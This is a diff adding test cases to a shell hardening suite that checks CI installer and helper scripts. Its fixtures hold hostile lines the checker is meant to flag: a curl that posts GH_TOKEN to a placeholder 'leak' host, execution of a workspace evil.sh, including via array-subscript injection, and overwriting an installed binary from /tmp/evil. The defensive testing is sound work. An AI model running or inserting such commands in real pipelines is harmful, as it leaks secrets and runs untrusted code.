@@ -145,5 +145,18 @@ case "$out" in *"helper-env-poison"*) got="yes";; *) got="no";; esac
 assert_eq "workspace-anchor-exit" "1" "$code"
 assert_eq "workspace-anchor-label" "yes" "$got"
 
+# --- installer binding (source/dest exact, single binding, no overwrite) ---
+t installer-src-evil 1 "muse-installer-source" happy.sarif "$I${FS}install -m 0755${FS}r${FS}\"\${tmp_bin}\"${FS}\"\${GITHUB_WORKSPACE}/tmp_bin_evil\""
+t installer-second 1 "muse-installer-overwrite" happy.sarif "$I${FS}install -m 0755 \"\${tmp_bin}\"${FS}a${FS}install -m 0755 \"\${tmp_bin}\" \"\${install_dir}/muse2\""
+t installer-cp-overwrite 1 "muse-installer-overwrite" happy.sarif "$I${FS}install -m 0755 \"\${tmp_bin}\"${FS}a${FS}cp /tmp/evil \"\${install_dir}/muse\""
+t installer-rebind 1 "muse-installer-rebind" happy.sarif "$I${FS}tmp_bin=\"\$(mktemp)\"${FS}a${FS}tmp_bin=/tmp/evil"
+
+# --- helper hardening: network tools, escaped hash, last-assign, subscript ---
+t helper-net-curl 1 "helper-network-tool" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}curl -d \"\$GH_TOKEN\" https://example.invalid/leak"
+t helper-escaped-hash 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \\#; bash \"\${GITHUB_WORKSPACE}/evil.sh\""
+t helper-last-assign 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}helper_path=\"\${SCRIPT_DIR}\"${RS}$H${FS}helper_path=\"\${SCRIPT_DIR}\"${FS}a${FS}helper_path=\"\${GITHUB_WORKSPACE}\"${RS}$H${FS}helper_path=\"\${GITHUB_WORKSPACE}\"${FS}a${FS}bash \"\${helper_path}/evil.sh\""
+t helper-subscript-exec 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}declare -a probe; [[ -v 'probe[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")]' ]] || true"
+t helper-subscript-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}[[ -v 'probe[x]' ]] || true"
+
 printf '\nhardening suite: %d passed, %d failed%s\n' "$pass" "$fail" "${fail_names:+ ($fail_names)}"
 [[ "$fail" -eq 0 ]]
